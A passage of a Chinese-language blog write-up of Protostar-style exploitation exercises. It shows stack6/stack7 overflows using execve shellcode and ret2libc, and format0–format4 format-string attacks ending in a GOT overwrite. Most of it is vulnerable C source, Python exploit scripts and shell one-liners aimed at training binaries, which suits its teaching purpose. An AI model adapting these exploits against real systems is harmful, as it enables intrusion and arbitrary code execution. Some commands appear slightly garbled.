+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filename: stack5.py</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">padding = <span class="string">'A'</span>*<span class="number">72</span></span><br><span class="line">shellcode =<span class="string">"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"</span></span><br><span class="line">shellcode = <span class="string">"\x90"</span>*<span class="number">4</span> + shellcode</span><br><span class="line">shellcode = (shellcode + <span class="string">'\x90'</span>*<span class="number">64</span>)[:<span class="number">64</span>]</span><br><span class="line">ebp = struct.pack(<span class="string">"I"</span>,<span class="number">0xbffffee0</span>)</span><br><span class="line">ret1 = struct.pack(<span class="string">"I"</span>,<span class="number">0x080484f9</span>)</span><br><span class="line">ret2 = struct.pack(<span class="string">"I"</span>,<span class="number">0xbffff7b4</span>) </span><br><span class="line">out = padding + ebp + ret1 + ret2 + shellcode + <span class="string">'\x00'</span></span><br><span class="line"><span class="keyword">print</span> out</span><br></pre></td></tr></table></figure>
+<p>在gdb中可以看到确实打开了bash，且程序正常退出。但在terminal中执行时爆出segment错误。猜测是堆栈中的无关项导致，没有很好的解决方法。</p>
+<p>考虑使用ret2libc来直接弹出shell。</p>
+<p>在gdb中可以直接使用<code>p system</code>查看system的地址为<code>0xb7ecffb0</code>，使用<code>info proc map</code>可以看到加载的c库为’/lib/libc-2.11.2.so’，我们需要使用libc库中的<code>&quot;/bin/sh&quot;</code>字符串。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ strings -a -t x /lib/libc-2.11.2.so | grep <span class="string">"/bin/sh"</span></span><br></pre></td></tr></table></figure>
+<p>得到其offset为<code>0x11f3bf</code>, 而libc.so在内存中的起始地址为 <code>0xb7e97000</code>, 布置shellocde如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filename: stack6ret2libc.py</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">padding = <span class="string">'A'</span>*<span class="number">80</span></span><br><span class="line">system = struct.pack(<span class="string">"I"</span>,<span class="number">0xb7ecffb0</span>)</span><br><span class="line">bin = struct.pack(<span class="string">"I"</span>,<span class="number">0xb7e97000</span> + <span class="number">0x11f3bf</span>)</span><br><span class="line">out = padding + system + <span class="string">'BBBB'</span> + bin + <span class="string">'\x00'</span>*<span class="number">4</span></span><br><span class="line"><span class="keyword">print</span> out</span><br></pre></td></tr></table></figure>
+<p>输入shellcode即可弹开shell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ (python stack6ret2libc.py; cat) | ./stack6</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-8-stack7"><a href="#2-8-stack7" class="headerlink" title="2.8 stack7"></a>2.8 stack7</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">getpath</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"input path please: "</span>); fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  gets(buffer);</span><br><span class="line"></span><br><span class="line">  ret = __builtin_return_address(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>((ret &amp; <span class="number">0xb0000000</span>) == <span class="number">0xb0000000</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"bzzzt (%p)\n"</span>, ret);</span><br><span class="line">      _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"got path %s\n"</span>, buffer);</span><br><span class="line">  <span class="keyword">return</span> strdup(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  getpath();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在stack6中，我们使用跳板或者ret2libc来解决对地址的限制。本题目中对返回地址做了进一步限制，使得无法直接ret2libc。可以看到不在<code>0xb0000000</code>地址范围内的只有stack7函数的.text字段。因此考虑重复使用ret。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># filename: stack7.py</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">padding = <span class="string">'A'</span>*<span class="number">80</span></span><br><span class="line">system = struct.pack(<span class="string">"I"</span>,<span class="number">0xb7ecffb0</span>)</span><br><span class="line">bin = struct.pack(<span class="string">"I"</span>,<span class="number">0xb7e97000</span> + <span class="number">0x11f3bf</span>)</span><br><span class="line">ret = struct.pack(<span class="string">"I"</span>,<span class="number">0x080484f9</span>)</span><br><span class="line">out = padding + ret + system + <span class="string">'BBBB'</span> + bin</span><br><span class="line"><span class="keyword">print</span> out</span><br></pre></td></tr></table></figure>
+<p>输入shellcode即可弹开shell<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ (python stack7.py; cat) | ./stack7</span><br></pre></td></tr></table></figure></p>
+<h2 id="3-Format-string"><a href="#3-Format-string" class="headerlink" title="3.Format string"></a>3.Format string</h2><p>格式化字符串漏洞常出现在攻击者可以控制printf类函数的格式化场景下。其典型的问题包括：</p>
+<ol>
+<li>泄露堆栈上的数据</li>
+<li>以%n形式向内存中写数据，进而截取程序执行流</li>
+</ol>
+<h3 id="3-1-Format0"><a href="#3-1-Format0" class="headerlink" title="3.1 Format0"></a>3.1 Format0</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">volatile</span> <span class="keyword">int</span> target;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  target = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(target == <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have hit the target correctly :)\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>sprintf</code>函数原型为<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sprintf</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>, <span class="keyword">char</span> *format [,argument,...])</span></span>;</span><br></pre></td></tr></table></figure></p>
+<p>此处可以不适用<code>arguments</code>，直接在<code>format</code>中填入足够长度的字符串，即可冲掉<code>target</code>的值</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./format `python -c <span class="string">"print 'A'*64+'\xef\xbe\xad\xde'"</span>`</span><br></pre></td></tr></table></figure>
+<h3 id="3-2-Format1"><a href="#3-2-Format1" class="headerlink" title="3.2 Format1"></a>3.2 Format1</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="built_in">string</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(target) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln(argv[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此题中使用用户输入作为格式化字符串。虽然没有传入参数，但程序认为此时的变量参数为stack上数据。<br>我们知道入参<code>argv[1]</code>会存放在stack上。通过如下方式可以显示stack上<code>argv[1]</code>的位置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./format1 <span class="string">"`python -c "</span><span class="built_in">print</span> <span class="string">'A'</span>*4 + <span class="string">'%08x'</span>*200<span class="string">"`"</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到打印出的41414141串，调整输入的长度，即可使得最后一个<code>%x</code>在打印时对应攻击者可以控制的<code>AAAA</code>，但输入长度调整会使得stack上分布发生变化，会出现对不起的情况，经过几次尝试后，可以使用如下指令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./format1 <span class="string">"`python -c "</span><span class="built_in">print</span> <span class="string">'A'</span>*4 +<span class="string">'A'</span>*8+ <span class="string">'%x.'</span>*128 + <span class="string">'%x'</span><span class="string">"`"</span></span><br></pre></td></tr></table></figure></p>
+<p>可以查看得到变量<code>target</code>位于.bss段，对应地址为<code>0x08049638</code>,使用<code>%n</code>即可覆盖该地址上的值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ objdump -t format1 | grep <span class="string">"target"</span></span><br><span class="line">$ ./format1 <span class="string">"`python -c "</span><span class="built_in">print</span> <span class="string">'\x38\x96\x04\x08'</span> +<span class="string">'A'</span>*8+ <span class="string">'%x.'</span>*128 + <span class="string">'%n'</span><span class="string">"`"</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="3-3-format2"><a href="#3-3-format2" class="headerlink" title="3.3 format2"></a>3.3 format2</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  fgets(buffer, <span class="keyword">sizeof</span>(buffer), <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buffer);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(target == <span class="number">64</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"target is %d :(\n"</span>, target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该题目中更近一步，需要将<code>target</code>更改为固定的值。改题目中stack上数据较干净，使用如下指令即可直接看到用户输入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'A'*4 +'%x.'*3 + '%x'"</span> | ./format2</span><br></pre></td></tr></table></figure></p>
+<p>查看变量<code>target</code>位于.bss段，对应地址为<code>0x080496e4</code>, 尝试<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print '\xe4\x96\x04\x08' +'%x.'*3 + '%x'"</span> | ./format2</span><br></pre></td></tr></table></figure></p>
+<p>得到<code>target</code>被修改为26,目标值为64，因此可以在打印内容中填充38个值即可<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print '\xe4\x96\x04\x08' +'B'*38+'%x.'*3 + '%x'"</span> | ./format2</span><br></pre></td></tr></table></figure></p>
+<p>另一种技巧为<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print '\xe4\x96\x04\x08' +'%x.'*2 + "</span>%46x.<span class="string">" + '%x'"</span> | ./format2</span><br></pre></td></tr></table></figure></p>
+<h3 id="3-4-format3"><a href="#3-4-format3" class="headerlink" title="3.4 format3"></a>3.4 format3</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printbuffer</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">string</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="built_in">string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  fgets(buffer, <span class="keyword">sizeof</span>(buffer), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">  printbuffer(buffer);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(target == <span class="number">0x01025544</span>) &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"you have modified the target :)\n"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"target is %08x :(\n"</span>, target);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>该题目相当于前两题的结合，stack上结构会随输入变化，且目标的值较大，为<code>0x01025544</code>,<code>%n</code>将已经打印的字符数字写入地址，直接写需要打印大量内容，这是这个题目的关键难点。</p>
+<p>尝试即可得到，目标<code>target</code>地址为<code>0x080496f4</code><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ `python -c <span class="string">"print 'AAAA' +'%x.'*11 + '%x'"</span> | ./format3</span><br></pre></td></tr></table></figure></p>
+<p>使用如下技巧可言下入特定值到特定位置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">'print "\xf4\x96\x04\x08" +'</span>%x%10<span class="variable">$08n</span><span class="string">"' | ./format3</span></span><br></pre></td></tr></table></figure></p>
+<p>写入值为<code>0x0e</code>, 我们可以将目标值分为两部分写入</p>
+<ul>
+<li>地址为<code>0x080496f4</code>写入<code>0x5544</code></li>
+<li>地址为<code>0x080496f6</code>写入<code>0x10102</code> (写入数目递增，此处使用溢出技巧)</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">'print "\xf4\x96\x04\x08" +"%x%10$08n"'</span> | ./format3</span><br></pre></td></tr></table></figure>
+<p>我们可以使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">'print "\xf4\x96\x04\x08\xf6\x96\x04\x08" +"%x%21820$08n" + +"%43966x%13$08n"'</span> | ./format3</span><br></pre></td></tr></table></figure>
+<p>也可以使用更多地址逐个写入，结合溢出技巧，进行如下处理</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">'print "\xf4\x96\x04\x08\xf5\x96\x04\x08\xf6\x96\x04\x08" +"%52x%12$08n"+"%17x%13$08n"+"%173x%14$08n"'</span> | ./format3</span><br></pre></td></tr></table></figure>
+<p>注意有坑，使用python产生输入时，如果将<code>&quot;</code>和<code>&#39;</code>顺序交换，则写入失败:(<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 'AAAA' +'%x.'*11 + '%x'"</span> | ./format3</span><br></pre></td></tr></table></figure></p>
+<h3 id="3-5-format4"><a href="#3-5-format4" class="headerlink" title="3.5 format4"></a>3.5 format4</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> target;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"code execution redirected! you win\n"</span>);</span><br><span class="line">  _exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  fgets(buffer, <span class="keyword">sizeof</span>(buffer), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此题中目标为执行<code>hello</code>函数，但缺少对其调用。而程序中存在格式化字符串漏洞。需要了解延迟绑定PLT和GOT原理。导入符号的地址通过PLT机制动态修改GOT中表项得到。因此可以利用格式化字符串将GOT中对应<code>exit</code>函数表象的地址修改为<code>hello</code>函数地址，在调用<code>exit</code>时即可达到攻击目标。</p>
+<p>使用objdump或gdb可以确定<code>hello</code>地址为<code>0x080484b4</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ (gdb) disamssble vuln</span><br><span class="line">$ (gdb) b *0x080485f0</span><br><span class="line">$ (gdb) x/3i 0x080483ec</span><br></pre></td></tr></table></figure>
+<p>可以得到<code>exit</code>在GOT中的地址为<code>0x08049724</code></p>
+<p>类似于前一题，攻击者需要在<code>0x08049724</code>写入<code>0x080484b4</code>，我们使用如下代码完成攻击</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">'print "\x24\x97\x04\x08\x26\x97\x04\x08" +"%33964x%4$08n"+"%33616x%5$08n"'</span> | ./format4</span><br></pre></td></tr></table></figure>
 
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃辣条<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">hacking</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
